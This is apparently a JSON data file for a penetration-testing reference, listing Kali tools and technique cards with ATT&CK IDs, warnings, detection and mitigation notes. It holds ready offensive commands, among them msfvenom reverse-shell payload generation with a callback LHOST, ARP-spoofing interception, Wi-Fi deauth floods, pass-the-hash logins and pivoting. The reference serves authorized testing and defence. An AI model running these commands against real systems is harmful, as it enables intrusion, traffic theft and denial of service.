 {"id":"tool-shodan","cat":"Tools","title":"Shodan CLI","desc":"Search engine for internet-exposed devices/services, with a CLI and Python API. Passive external attack-surface recon.","url":"https://github.com/achillean/shodan-python","license":"MIT","platforms":["windows","macos","linux"],"tags":["osint","network","tools"],"attack":["T1596.005"],"install":{"cmd":"pip install shodan","mac":"pip3 install shodan","linux":"pip3 install shodan"}},
 {"id":"osint-shodan-cli","cat":"OSINT","title":"Shodan CLI - setup & common queries","desc":"Install the Shodan CLI, set your API key, and run the everyday lookups. Requires a Shodan account/API key.","danger":"OSINT - authorized engagements only; reads a third-party database, not the target.","team":"red","tags":["osint","network"],"attack":["T1596.005"],"detect":"Passive - invisible to the target; monitor your OWN external surface for exposure instead.","mitigate":"Reduce internet-exposed services; request removal; continuous EASM monitoring.","code":{"linux":"pip install shodan\nshodan init {{APIKEY:YOUR_API_KEY}}\nshodan host {{IP:1.1.1.1}}\nshodan search --fields ip_str,port,org \"{{QUERY:apache}}\"\nshodan count \"{{QUERY:apache}}\"\nshodan domain {{DOMAIN:example.com}}\nshodan myip","mac":"pip3 install shodan\nshodan init {{APIKEY:YOUR_API_KEY}}\nshodan host {{IP:1.1.1.1}}\nshodan search --fields ip_str,port,org \"{{QUERY:apache}}\"\nshodan domain {{DOMAIN:example.com}}","ps":"pip install shodan\nshodan init {{APIKEY:YOUR_API_KEY}}\nshodan host {{IP:1.1.1.1}}\nshodan search --fields ip_str,port,org \"{{QUERY:apache}}\""}},
 {"id":"tool-netdiscover","cat":"Tools","title":"netdiscover","desc":"Active/passive ARP reconnaissance to find live hosts on a local segment.","url":"https://www.kali.org/tools/netdiscover/","license":"open source","platforms":["linux"],"tags":["recon","network","tools"],"install":{"linux":"sudo apt install netdiscover"}},
 {"id":"tool-fping","cat":"Tools","title":"fping","desc":"Parallel ICMP sweeper that pings many hosts at once and reports which are alive.","url":"https://www.kali.org/tools/fping/","license":"open source","platforms":["linux","macos"],"tags":["recon","network","tools"],"install":{"linux":"sudo apt install fping","mac":"brew install fping"}},
 {"id":"tool-dnsrecon","cat":"Tools","title":"dnsrecon","desc":"DNS enumeration tool: records, zone transfers, brute force, and reverse lookups.","url":"https://www.kali.org/tools/dnsrecon/","license":"open source","platforms":["linux"],"tags":["recon","dns","tools"],"install":{"linux":"sudo apt install dnsrecon"}},
 {"id":"tool-dnsenum","cat":"Tools","title":"dnsenum","desc":"Enumerate DNS info: hosts, records, MX, zone transfers, and subdomain brute force.","url":"https://www.kali.org/tools/dnsenum/","license":"open source","platforms":["linux"],"tags":["recon","dns","subdomain","tools"],"install":{"linux":"sudo apt install dnsenum"}},
 {"id":"tool-fierce","cat":"Tools","title":"fierce","desc":"DNS reconnaissance and subdomain scanner for locating non-contiguous IP space.","url":"https://www.kali.org/tools/fierce/","license":"open source","platforms":["linux"],"tags":["recon","dns","subdomain","tools"],"install":{"linux":"sudo apt install fierce"}},
 {"id":"tool-sublist3r","cat":"Tools","title":"Sublist3r","desc":"Passive subdomain enumeration using public search engines and OSINT sources.","url":"https://www.kali.org/tools/sublist3r/","license":"open source","platforms":["linux"],"tags":["recon","subdomain","osint","tools"],"install":{"linux":"sudo apt install sublist3r"}},
 {"id":"tool-recon-ng","cat":"Tools","title":"recon-ng","desc":"Full-featured modular OSINT reconnaissance framework (Metasploit-style workflow).","url":"https://www.kali.org/tools/recon-ng/","license":"open source","platforms":["linux"],"tags":["recon","osint","tools"],"install":{"linux":"sudo apt install recon-ng"}},
 {"id":"tool-onesixtyone","cat":"Tools","title":"onesixtyone","desc":"Fast SNMP scanner that brute-forces community strings across a range.","url":"https://www.kali.org/tools/onesixtyone/","license":"open source","platforms":["linux"],"tags":["recon","snmp","network","tools"],"install":{"linux":"sudo apt install onesixtyone"}},
 {"id":"tool-snmp-check","cat":"Tools","title":"snmp-check","desc":"Enumerate a host over SNMP into a human-readable report (system, users, routes, processes).","url":"https://www.kali.org/tools/snmp-check/","license":"open source","platforms":["linux"],"tags":["recon","snmp","enumeration","tools"],"install":{"linux":"sudo apt install snmp-check"}},
 {"id":"tool-wfuzz","cat":"Tools","title":"wfuzz","desc":"Web application fuzzer for content discovery, parameters, and injection points.","url":"https://www.kali.org/tools/wfuzz/","license":"open source","platforms":["linux"],"tags":["web","enumeration","tools"],"install":{"linux":"sudo apt install wfuzz"}},
 {"id":"tool-commix","cat":"Tools","title":"commix","desc":"Automated command-injection detection and exploitation tool.","url":"https://www.kali.org/tools/commix/","license":"open source","platforms":["linux"],"tags":["web","exploitation","tools"],"install":{"linux":"sudo apt install commix"}},
 {"id":"tool-mdk4","cat":"Tools","title":"mdk4","desc":"802.11 stress-testing / attack tool (deauth, beacon flood, auth DoS).","url":"https://www.kali.org/tools/mdk4/","license":"open source","platforms":["linux"],"tags":["wireless","network","tools"],"install":{"linux":"sudo apt install mdk4"}},
 {"id":"tool-bettercap","cat":"Tools","title":"bettercap","desc":"Swiss-army knife for network recon and MITM (ARP/DNS spoofing, sniffing, proxies).","url":"https://www.kali.org/tools/bettercap/","license":"open source","platforms":["linux"],"tags":["network","tools"],"install":{"linux":"sudo apt install bettercap"}},
 {"id":"tool-ettercap","cat":"Tools","title":"ettercap","desc":"Suite for man-in-the-middle attacks on a LAN (ARP poisoning, sniffing, filtering).","url":"https://www.kali.org/tools/ettercap/","license":"open source","platforms":["linux"],"tags":["network","tools"],"install":{"linux":"sudo apt install ettercap-text-only"}},
 {"id":"tool-mitmproxy","cat":"Tools","title":"mitmproxy","desc":"Interactive TLS-capable intercepting HTTP(S) proxy with a CLI and scripting API.","url":"https://www.kali.org/tools/mitmproxy/","license":"open source","platforms":["linux","macos"],"tags":["web","network","tools"],"install":{"linux":"sudo apt install mitmproxy","mac":"brew install mitmproxy"}},
 {"id":"tool-msfvenom","cat":"Tools","title":"msfvenom","desc":"Metasploit payload generator and encoder (part of metasploit-framework).","url":"https://www.kali.org/tools/metasploit-framework/","license":"open source","platforms":["linux"],"tags":["exploitation","tools"],"install":{"linux":"sudo apt install metasploit-framework"}},
 {"id":"tool-evil-winrm","cat":"Tools","title":"evil-winrm","desc":"WinRM shell for Windows post-exploitation with upload/download and script loading.","url":"https://www.kali.org/tools/evil-winrm/","license":"open source","platforms":["linux"],"tags":["post-ex","remote","tools"],"install":{"linux":"sudo apt install evil-winrm"}},
 {"id":"tool-proxychains","cat":"Tools","title":"proxychains-ng","desc":"Force TCP connections from any tool through SOCKS/HTTP proxies (pivoting).","url":"https://www.kali.org/tools/proxychains-ng/","license":"open source","platforms":["linux"],"tags":["post-ex","network","tools"],"install":{"linux":"sudo apt install proxychains4"}},
 {"id":"tool-socat","cat":"Tools","title":"socat","desc":"Multipurpose relay: bidirectional byte streams between sockets, files, pipes, PTYs.","url":"https://www.kali.org/tools/socat/","license":"open source","platforms":["linux","macos"],"tags":["network","file-transfer","tools"],"install":{"linux":"sudo apt install socat","mac":"brew install socat"}},
 {"id":"tool-binwalk","cat":"Tools","title":"binwalk","desc":"Firmware analysis: scan a binary for embedded files/filesystems and extract them.","url":"https://www.kali.org/tools/binwalk/","license":"open source","platforms":["linux","macos"],"tags":["forensics","tools"],"install":{"linux":"sudo apt install binwalk","mac":"brew install binwalk"}},
 {"id":"tool-foremost","cat":"Tools","title":"foremost","desc":"Signature-based file carver that recovers files from disk images by header/footer.","url":"https://www.kali.org/tools/foremost/","license":"open source","platforms":["linux"],"tags":["forensics","recovery","tools"],"install":{"linux":"sudo apt install foremost"}},
 {"id":"tool-steghide","cat":"Tools","title":"steghide","desc":"Steganography tool to embed/extract data hidden in JPEG/BMP/WAV/AU files.","url":"https://www.kali.org/tools/steghide/","license":"open source","platforms":["linux"],"tags":["forensics","tools"],"install":{"linux":"sudo apt install steghide"}},
 {"id":"tool-radare2","cat":"Tools","title":"radare2","desc":"Open-source reverse-engineering framework: disassembler, debugger, hex editor.","url":"https://www.kali.org/tools/radare2/","license":"open source","platforms":["linux","macos"],"tags":["forensics","reference","tools"],"install":{"linux":"sudo apt install radare2","mac":"brew install radare2"}},
 {"id":"tool-gdb","cat":"Tools","title":"gdb","desc":"The GNU debugger for dynamic analysis of native binaries (pair with pwndbg/gef).","url":"https://www.kali.org/tools/gdb/","license":"open source","platforms":["linux","macos"],"tags":["forensics","reference","tools"],"install":{"linux":"sudo apt install gdb"}},
 {"id":"tool-volatility3","cat":"Tools","title":"Volatility 3","desc":"Advanced volatile-memory forensics framework for analyzing RAM dumps.","url":"https://www.kali.org/tools/volatility3/","license":"open source","platforms":["linux"],"tags":["forensics","memory","tools"],"install":{"linux":"sudo apt install volatility3"}},
 {"id":"recon-netdiscover","cat":"Reconnaissance","team":"red","title":"ARP host discovery (netdiscover)","desc":"Find live hosts on the local L2 segment via ARP, without noisy port scans.","danger":"Authorized networks only; sends ARP traffic across the segment.","tags":["recon","network","discovery"],"attack":["T1018"],"detect":"Bursts of ARP requests sweeping sequential addresses from one host; watch switch/ARP tables.","mitigate":"Port security, DHCP snooping / dynamic ARP inspection, and NAC to flag rogue hosts.","code":{"linux":"sudo netdiscover -r {{CIDR:192.168.1.0/24}} -P   # -P one-shot table; omit for live view"},"related":["recon-arp-scan","recon-fping-sweep","recon-host-discovery"]},
 {"id":"recon-fping-sweep","cat":"Reconnaissance","team":"red","title":"ICMP host sweep (fping)","desc":"Enumerate live hosts across a range fast with parallel ICMP echo requests.","danger":"Authorized networks only.","tags":["recon","network","discovery"],"attack":["T1018"],"detect":"High-rate ICMP echo to sequential addresses from a single source.","mitigate":"Rate-limit/deny ICMP at boundaries where feasible; alert on sweep patterns.","code":{"linux":"fping -a -g {{CIDR:192.168.1.0/24}} 2>/dev/null   # -a alive only, -g generate range"},"related":["recon-netdiscover","recon-host-discovery"]},
 {"id":"recon-dnsrecon","cat":"Reconnaissance","team":"red","title":"DNS enumeration (dnsrecon)","desc":"Pull standard records, attempt zone transfer, and brute-force subdomains in one tool.","danger":"Authorized targets only.","tags":["recon","dns","subdomain"],"attack":["T1590.002"],"detect":"AXFR attempts and high-volume DNS queries/NXDOMAIN from one resolver client.","mitigate":"Restrict zone transfers to secondaries; monitor authoritative logs for AXFR and brute patterns.","code":{"linux":"dnsrecon -d {{DOMAIN:example.com}} -t std          # std records\ndnsrecon -d {{DOMAIN:example.com}} -t axfr         # zone transfer\ndnsrecon -d {{DOMAIN:example.com}} -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt"},"related":["recon-dnsenum","recon-fierce","recon-dns-records","recon-dns-axfr"]},
 {"id":"recon-dnsenum","cat":"Reconnaissance","team":"red","title":"DNS + subdomain brute (dnsenum)","desc":"Enumerate records, MX, name servers, attempt AXFR, and brute-force subdomains.","danger":"Authorized targets only.","tags":["recon","dns","subdomain"],"attack":["T1590.002"],"detect":"AXFR attempts plus a burst of subdomain lookups from one client.","mitigate":"Lock down zone transfers; alert on DNS brute-force patterns.","code":{"linux":"dnsenum --enum {{DOMAIN:example.com}} -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"},"related":["recon-dnsrecon","recon-sublist3r","recon-subdomains"]},
 {"id":"recon-fierce","cat":"Reconnaissance","team":"red","title":"DNS recon scan (fierce)","desc":"Locate likely targets and non-contiguous IP space around a domain via DNS.","danger":"Authorized targets only.","tags":["recon","dns","subdomain"],"attack":["T1590.002"],"detect":"Sequential DNS lookups probing common hostnames from one client.","mitigate":"Monitor authoritative DNS logs; restrict zone transfers.","code":{"linux":"fierce --domain {{DOMAIN:example.com}}"},"related":["recon-dnsrecon","recon-subdomains"]},
 {"id":"recon-sublist3r","cat":"Reconnaissance","team":"red","title":"Passive subdomain enum (Sublist3r)","desc":"Gather subdomains from search engines and OSINT sources without touching the target.","danger":"Uses third-party OSINT sources; run only for authorized engagements.","tags":["recon","subdomain","osint"],"attack":["T1590.002"],"detect":"Largely passive (third-party sources); little direct target-side signal.","mitigate":"Minimize public exposure of hostnames; monitor certificate transparency for leaks.","code":{"linux":"sublist3r -d {{DOMAIN:example.com}} -o subs.txt"},"related":["recon-subdomains","recon-dnsenum","osint-cert-transparency"]},
 {"id":"recon-reconng","cat":"Reconnaissance","team":"red","title":"OSINT recon framework (recon-ng)","desc":"Run modular OSINT recon (hosts, contacts, breaches) in a Metasploit-style console.","danger":"Queries third-party data sources; run only for authorized engagements.","tags":["recon","osint"],"attack":["T1596"],"detect":"Mostly passive third-party queries; minimal direct target signal.","mitigate":"Reduce public data exposure; monitor for credential/breach leaks tied to your domains.","code":{"linux":"recon-ng\n[recon-ng] marketplace install all\n[recon-ng] modules load recon/domains-hosts/hackertarget\n[recon-ng] options set SOURCE {{DOMAIN:example.com}}\n[recon-ng] run"},"related":["osint-theharvester","recon-sublist3r"]},
 {"id":"recon-onesixtyone","cat":"Reconnaissance","team":"red","title":"SNMP community scan (onesixtyone)","desc":"Brute-force SNMP community strings across a range to find manageable devices.","danger":"Authorized targets only.","tags":["recon","snmp","network"],"attack":["T1046"],"detect":"Many SNMP GET attempts with varied community strings from one source.","mitigate":"Disable SNMP or use SNMPv3 with auth/priv; ACL the management plane; drop default communities.","code":{"linux":"onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {{TARGET:10.0.0.0/24}}"},"related":["recon-snmpcheck","recon-snmp-walk"]},
 {"id":"recon-snmpcheck","cat":"Reconnaissance","team":"red","title":"SNMP enumeration (snmp-check)","desc":"Enumerate a device over SNMP into a readable report: system, users, routes, processes.","danger":"Authorized targets only.","tags":["recon","snmp","enumeration"],"attack":["T1046"],"detect":"Bulk SNMP walks pulling large OID subtrees from one client.","mitigate":"SNMPv3 only; restrict to management hosts; rotate and retire default communities.","code":{"linux":"snmp-check -c {{COMMUNITY:public}} {{TARGET:10.0.0.5}}"},"related":["recon-onesixtyone","recon-snmp-walk"]},
 {"id":"web-wfuzz","cat":"Web App Testing","team":"red","title":"Web fuzzing (wfuzz)","desc":"Fuzz paths, parameters, and values with wordlists; filter noise by code/size/words.","danger":"Authorized targets only.","tags":["web","enumeration"],"attack":["T1595.003"],"detect":"High-volume requests iterating a wordlist against one host; spikes of 404/403.","mitigate":"Rate-limit, WAF, and monitor for content-discovery patterns.","code":{"linux":"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 https://{{TARGET:example.com}}/FUZZ"},"related":["web-gobuster-dir","web-ffuf-param","web-feroxbuster"]},
 {"id":"web-commix","cat":"Web App Testing","team":"red","title":"Command-injection testing (commix)","desc":"Detect and exploit OS command injection in web parameters automatically.","danger":"Highly intrusive; runs commands on the target. Authorized testing only.","tags":["web","exploitation"],"attack":["T1190"],"detect":"Anomalous parameters containing shell metacharacters; unexpected process spawns from the web user.","mitigate":"Validate/allow-list input, avoid shell calls, run apps least-privileged, deploy a WAF.","code":{"linux":"commix --url \"https://{{TARGET:example.com}}/page?id=1\" --batch"},"related":["web-sqlmap","web-dalfox"]},
 {"id":"wifi-mdk4-deauth","cat":"Wireless Auditing","team":"red","title":"Wi-Fi deauth / beacon flood (mdk4)","desc":"Stress-test 802.11 with deauthentication or beacon-flood attacks from monitor mode.","danger":"Denial of service against wireless clients/APs. Authorized, isolated testing only.","tags":["wireless","network"],"attack":["T1498"],"detect":"Floods of deauth/disassoc or spurious beacons; IDS/WIPS alarms and client drop-offs.","mitigate":"Enable 802.11w (protected management frames); deploy a WIPS; investigate deauth spikes.","code":{"linux":"sudo mdk4 {{IFACE:wlan0mon}} d -c {{CHAN:6}}     # d = deauth flood\nsudo mdk4 {{IFACE:wlan0mon}} b -c {{CHAN:6}}     # b = beacon flood"},"related":["wifi-deauth-aireplay","wifi-deauth-detect"]},
 {"id":"net-bettercap-mitm","cat":"Network","team":"purple","title":"ARP-spoof MITM (bettercap)","desc":"Position between a host and the gateway on a LAN to sniff and manipulate traffic.","danger":"Intercepts other users' traffic. Authorized, isolated testing only.","tags":["network"],"attack":["T1557.002"],"detect":"Duplicate/changing MAC for the gateway IP; gratuitous ARP; IDS ARP-spoof alerts.","mitigate":"Dynamic ARP inspection, DHCP snooping, static ARP for critical hosts, and 802.1X.","code":{"linux":"sudo bettercap -iface {{IFACE:eth0}}\n> set arp.spoof.targets {{TARGET:10.0.0.5}}\n> arp.spoof on\n> net.sniff on"},"related":["net-ettercap-mitm","net-mitmproxy"]},
 {"id":"net-ettercap-mitm","cat":"Network","team":"purple","title":"ARP-poison MITM (ettercap)","desc":"Classic LAN man-in-the-middle via ARP poisoning with live sniffing.","danger":"Intercepts other users' traffic. Authorized, isolated testing only.","tags":["network"],"attack":["T1557.002"],"detect":"ARP cache anomalies (one MAC for many IPs); WIPS/NIDS ARP-poison signatures.","mitigate":"Dynamic ARP inspection, static ARP entries, network segmentation.","code":{"linux":"sudo ettercap -T -q -i {{IFACE:eth0}} -M arp /{{TARGET:10.0.0.5}}// /{{GATEWAY:10.0.0.1}}//"},"related":["net-bettercap-mitm","net-mitmproxy"]},
 {"id":"net-mitmproxy","cat":"Network","team":"purple","title":"Intercept HTTP(S) (mitmproxy)","desc":"Run a TLS-capable intercepting proxy to inspect and modify web traffic.","danger":"Requires installing a CA on the client; intercepts TLS. Authorized testing only.","tags":["web","network"],"attack":["T1557"],"detect":"Unexpected proxy CA in client trust store; traffic routed via a proxy host.","mitigate":"Certificate pinning, HSTS, and controls on client proxy/CA configuration.","code":{"linux":"mitmproxy --mode regular --listen-port {{PORT:8080}}   # then set client proxy to this host:8080"},"related":["net-bettercap-mitm"]},
 {"id":"net-socat-relay","cat":"Network","title":"Relay & port-forward (socat)","desc":"Bidirectional stream relay: forward a local port to a remote service or bridge sockets.","danger":"Opens listening sockets/forwards traffic; use only where authorized.","tags":["network","file-transfer"],"code":{"linux":"# local port -> remote service (forward)\nsocat TCP-LISTEN:{{LPORT:8080}},fork,reuseaddr TCP:{{RHOST:10.0.0.5}}:{{RPORT:80}}\n# quick file receive\nsocat -u TCP-LISTEN:{{PORT:9000}},reuseaddr OPEN:incoming.bin,creat"},"related":["net-mitmproxy"]},
 {"id":"exp-msfvenom","cat":"Exploitation Frameworks","team":"red","title":"Generate payloads (msfvenom)","desc":"Build and encode Metasploit payloads (reverse shells, stagers) for authorized testing.","danger":"Generates offensive payloads. Authorized engagements only; handle artifacts carefully.","tags":["exploitation"],"attack":["T1587.001"],"detect":"Known Metasploit payload signatures/shellcode; EDR/AV detections; unexpected outbound to LHOST.","mitigate":"EDR with behavioral detection, application allow-listing, egress filtering, and network segmentation.","code":{"linux":"# Windows reverse shell exe\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{LHOST:10.0.0.1}} LPORT={{LPORT:4444}} -f exe -o shell.exe\n# Linux ELF\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST={{LHOST:10.0.0.1}} LPORT={{LPORT:4444}} -f elf -o shell.elf"},"related":["post-evil-winrm","post-remote-execution"]},
 {"id":"post-evil-winrm","cat":"Post-Exploitation","team":"red","title":"WinRM shell (evil-winrm)","desc":"Interactive Windows shell over WinRM with file transfer and in-memory script loading.","danger":"Authorized access only; produces remote-service logons on the target.","tags":["post-ex","remote","active-directory"],"attack":["T1021.006"],"detect":"WinRM logons (Event 4624 type 3 to WSMan), wsmprovhost.exe spawns, and 5985/5986 traffic.","mitigate":"Restrict WinRM to admin hosts, require TLS, monitor 4624/wsmprovhost, and enforce least privilege.","code":{"linux":"# password\nevil-winrm -i {{TARGET:10.0.0.5}} -u {{USER:administrator}} -p '{{PASS:Password1}}'\n# pass-the-hash\nevil-winrm -i {{TARGET:10.0.0.5}} -u {{USER:administrator}} -H {{NTLM:aad3b435b51404ee...}}"},"related":["post-pass-the-hash-ticket","post-remote-execution","post-remote-services-lateral"]},
 {"id":"post-proxychains","cat":"Post-Exploitation","team":"red","title":"Pivot through a SOCKS proxy (proxychains)","desc":"Route any TCP tool through a compromised host's SOCKS proxy to reach internal networks.","danger":"Authorized engagements only; tunnels tooling into internal segments.","tags":["post-ex","network"],"attack":["T1090"],"detect":"Unexpected SOCKS listeners on hosts; internal connections sourced from a single pivot.","mitigate":"Egress/east-west segmentation, monitor for proxy processes, and restrict lateral connectivity.","code":{"linux":"# set a SOCKS proxy in /etc/proxychains4.conf, e.g.  socks5 127.0.0.1 1080\nproxychains4 nmap -sT -Pn -p 445,3389 {{TARGET:10.10.10.0/24}}\nproxychains4 evil-winrm -i {{HOST:10.10.10.5}} -u {{USER:admin}} -p '{{PASS:pass}}'"},"related":["post-remote-services-lateral","post-evil-winrm"]},
 {"id":"for-binwalk","cat":"Forensics","team":"blue","title":"Firmware / file carving (binwalk)","desc":"Scan a binary or firmware image for embedded files and filesystems, then extract them.","tags":["forensics"],"code":{"linux":"binwalk {{FILE:firmware.bin}}          # scan for signatures\nbinwalk -e {{FILE:firmware.bin}}       # extract known types (into _firmware.bin.extracted/)"},"related":["for-foremost"]},
 {"id":"for-foremost","cat":"Forensics","team":"blue","title":"File carving by signature (foremost)","desc":"Recover files from a disk image or raw device by header/footer signatures.","danger":"Carve to a different disk than the source to avoid overwriting evidence.","tags":["forensics","recovery"],"code":{"linux":"foremost -i {{IMAGE:disk.img}} -o output/       # -t jpg,pdf,doc to target types"},"related":["for-dd-image","for-binwalk"]},
 {"id":"for-steghide","cat":"Forensics","team":"blue","title":"Hidden-data extraction (steghide)","desc":"Detect and extract data hidden with steghide in JPEG/BMP/WAV/AU carriers.","tags":["forensics"],"code":{"linux":"steghide info {{FILE:image.jpg}}                       # show embedded info\nsteghide extract -sf {{FILE:image.jpg}} -p '{{PASS:}}'   # extract (blank pass ok)"},"related":["osint-exiftool-meta"]},
 {"id":"re-radare2","cat":"Forensics","team":"blue","title":"Reverse-engineer a binary (radare2)","desc":"Static/dynamic analysis: analyze functions, disassemble, and inspect strings/xrefs.","tags":["forensics","reference"],"code":{"linux":"r2 -A {{BIN:./sample}}     # -A auto-analyze, then:\n[0x0000] aaa            # deeper analysis\n[0x0000] afl            # list functions\n[0x0000] pdf @ main     # disassemble main\n[0x0000] iz             # strings in data"},"related":["re-gdb","for-volatility3"]},
 {"id":"re-gdb","cat":"Forensics","team":"blue","title":"Debug a binary (gdb + pwndbg)","desc":"Dynamic analysis of native binaries: breakpoints, registers, memory, and stack.","tags":["forensics","reference"],"code":{"linux":"gdb -q {{BIN:./sample}}\n(gdb) break main\n(gdb) run {{ARGS:}}\n(gdb) info registers\n(gdb) x/32xw $rsp        # examine stack\n(gdb) continue"},"related":["re-radare2"]},
 {"id":"for-volatility3","cat":"Forensics","team":"blue","title":"Analyze a memory image (Volatility 3)","desc":"Triage a RAM capture: processes, network connections, command lines, and injected code.","danger":"Work on a copy of the memory image; record hashes for chain of custody.","tags":["forensics","memory"],"attack":["T1055"],"detect":"Look for hidden/hollowed processes, unusual parent-child chains, and unbacked executable memory.","mitigate":"N/A (analysis). Feed findings (IOCs, injected PIDs) into containment and detection rules.","code":{"linux":"vol -f {{DUMP:mem.lime}} windows.pslist\nvol -f {{DUMP:mem.lime}} windows.pstree\nvol -f {{DUMP:mem.lime}} windows.netscan\nvol -f {{DUMP:mem.lime}} windows.malfind    # injected/unbacked code"},"related":["for-memdump","ir-proc-hash"]},
 {"id":"tool-amass","cat":"Tools","title":"amass","desc":"In-depth attack-surface mapping and subdomain enumeration (OWASP).","url":"https://www.kali.org/tools/amass/","license":"open source","platforms":["linux"],"tags":["recon","subdomain","osint","tools"],"install":{"linux":"sudo apt install amass"}},
 {"id":"tool-subfinder","cat":"Tools","title":"subfinder","desc":"Fast passive subdomain discovery from many data sources (ProjectDiscovery).","url":"https://www.kali.org/tools/subfinder/","license":"open source","platforms":["linux"],"tags":["recon","subdomain","osint","tools"],"install":{"linux":"sudo apt install subfinder"}},
 {"id":"tool-theharvester","cat":"Tools","title":"theHarvester","desc":"Gather emails, subdomains, hosts, and names from public OSINT sources.","url":"https://www.kali.org/tools/theharvester/","license":"open source","platforms":["linux"],"tags":["osint","recon","mail","tools"],"install":{"linux":"sudo apt install theharvester"}},
 {"id":"tool-whatweb","cat":"Tools","title":"WhatWeb","desc":"Fingerprint web technologies, frameworks, servers, and versions.","url":"https://www.kali.org/tools/whatweb/","license":"open source","platforms":["linux"],"tags":["web","recon","tools"],"install":{"linux":"sudo apt install whatweb"}},
 {"id":"tool-wafw00f","cat":"Tools","title":"wafw00f","desc":"Identify and fingerprint the Web Application Firewall in front of a site.","url":"https://www.kali.org/tools/wafw00f/","license":"open source","platforms":["linux"],"tags":["web","recon","tools"],"install":{"linux":"sudo apt install wafw00f"}},
 {"id":"tool-nbtscan","cat":"Tools","title":"nbtscan","desc":"Scan networks for NetBIOS name information (names, shares, MACs).","url":"https://www.kali.org/tools/nbtscan/","license":"open source","platforms":["linux"],"tags":["recon","smb","network","tools"],"install":{"linux":"sudo apt install nbtscan"}},
 {"id":"tool-enum4linux-ng","cat":"Tools","title":"enum4linux-ng","desc":"Modern SMB/Windows enumeration: users, shares, groups, policy (rewrite of enum4linux).","url":"https://www.kali.org/tools/enum4linux-ng/","license":"open source","platforms":["linux"],"tags":["recon","smb","enumeration","tools"],"install":{"linux":"sudo apt install enum4linux-ng"}},
 {"id":"tool-smbmap","cat":"Tools","title":"smbmap","desc":"Enumerate SMB shares and permissions across a host or network, with file ops.","url":"https://www.kali.org/tools/smbmap/","license":"open source","platforms":["linux"],"tags":["recon","smb","enumeration","tools"],"install":{"linux":"sudo apt install smbmap"}},
 {"id":"tool-sslscan","cat":"Tools","title":"sslscan","desc":"Query a server's supported SSL/TLS versions, ciphers, and certificate.","url":"https://www.kali.org/tools/sslscan/","license":"open source","platforms":["linux"],"tags":["tls","certificates","network","tools"],"install":{"linux":"sudo apt install sslscan"}},
 {"id":"tool-searchsploit","cat":"Tools","title":"searchsploit (Exploit-DB)","desc":"Offline command-line search of the Exploit-DB archive of exploits and shellcode.","url":"https://www.kali.org/tools/exploitdb/","license":"open source","platforms":["linux"],"tags":["exploitation","reference","tools"],"install":{"linux":"sudo apt install exploitdb"}},
 {"id":"tool-gobuster","cat":"Tools","title":"gobuster","desc":"Fast brute-forcer for directories, DNS subdomains, and virtual hosts.","url":"https://www.kali.org/tools/gobuster/","license":"open source","platforms":["linux"],"tags":["web","enumeration","tools"],"install":{"linux":"sudo apt install gobuster"}},
 {"id":"tool-feroxbuster","cat":"Tools","title":"feroxbuster","desc":"Fast, recursive content discovery for web servers (Rust).","url":"https://www.kali.org/tools/feroxbuster/","license":"open source","platforms":["linux"],"tags":["web","enumeration","tools"],"install":{"linux":"sudo apt install feroxbuster"}},
 {"id":"tool-dirb","cat":"Tools","title":"dirb","desc":"Classic web content scanner that brute-forces directories and files.","url":"https://www.kali.org/tools/dirb/","license":"open source","platforms":["linux"],"tags":["web","enumeration","tools"],"install":{"linux":"sudo apt install dirb"}},
 {"id":"tool-dalfox","cat":"Tools","title":"dalfox","desc":"Fast, parameter-analysis-based XSS scanner and testing tool.","url":"https://www.kali.org/tools/dalfox/","license":"open source","platforms":["linux"],"tags":["web","exploitation","tools"],"install":{"linux":"sudo apt install dalfox"}},
 {"id":"tool-medusa","cat":"Tools","title":"Medusa","desc":"Fast, parallel, modular login brute-forcer for many network protocols.","url":"https://www.kali.org/tools/medusa/","license":"open source","platforms":["linux"],"tags":["password","network","tools"],"install":{"linux":"sudo apt install medusa"}},
 {"id":"tool-ncrack","cat":"Tools","title":"Ncrack","desc":"High-speed network authentication cracker from the Nmap project.","url":"https://www.kali.org/tools/ncrack/","license":"open source","platforms":["linux"],"tags":["password","network","tools"],"install":{"linux":"sudo apt install ncrack"}},
 {"id":"tool-crunch","cat":"Tools","title":"crunch","desc":"Generate custom wordlists from a character set and pattern.","url":"https://www.kali.org/tools/crunch/","license":"open source","platforms":["linux"],"tags":["password","tools"],"install":{"linux":"sudo apt install crunch"}},
 {"id":"tool-cewl","cat":"Tools","title":"CeWL","desc":"Spider a target site to build a custom wordlist from its content.","url":"https://www.kali.org/tools/cewl/","license":"open source","platforms":["linux"],"tags":["password","osint","tools"],"install":{"linux":"sudo apt install cewl"}},
 {"id":"tool-hashid","cat":"Tools","title":"hashID","desc":"Identify the probable type(s) of a given hash.","url":"https://www.kali.org/tools/hashid/","license":"open source","platforms":["linux"],"tags":["password","tools"],"install":{"linux":"sudo apt install hashid"}},
 {"id":"tool-wifite","cat":"Tools","title":"Wifite","desc":"Automated wireless auditor that wraps aircrack-ng, reaver, and hashcat.","url":"https://www.kali.org/tools/wifite/","license":"open source","platforms":["linux"],"tags":["wireless","tools"],"install":{"linux":"sudo apt install wifite"}},
 {"id":"tool-reaver","cat":"Tools","title":"Reaver","desc":"Brute-force WPS PINs to recover WPA/WPA2 passphrases.","url":"https://www.kali.org/tools/reaver/","license":"open source","platforms":["linux"],"tags":["wireless","tools"],"install":{"linux":"sudo apt install reaver"}},
 {"id":"tool-bully","cat":"Tools","title":"Bully","desc":"Alternative WPS PIN brute-force implementation.","url":"https://www.kali.org/tools/bully/","license":"open source","platforms":["linux"],"tags":["wireless","tools"],"install":{"linux":"sudo apt install bully"}},
 {"id":"tool-hcxdumptool","cat":"Tools","title":"hcxdumptool","desc":"Capture WPA PMKID/handshakes from Wi-Fi for offline cracking.","url":"https://www.kali.org/tools/hcxdumptool/","license":"open source","platforms":["linux"],"tags":["wireless","tools"],"install":{"linux":"sudo apt install hcxdumptool"}},
 {"id":"tool-kismet","cat":"Tools","title":"Kismet","desc":"Wireless network detector, sniffer, and WIDS (passive wardriving).","url":"https://www.kali.org/tools/kismet/","license":"open source","platforms":["linux"],"tags":["wireless","network","tools"],"install":{"linux":"sudo apt install kismet"}},
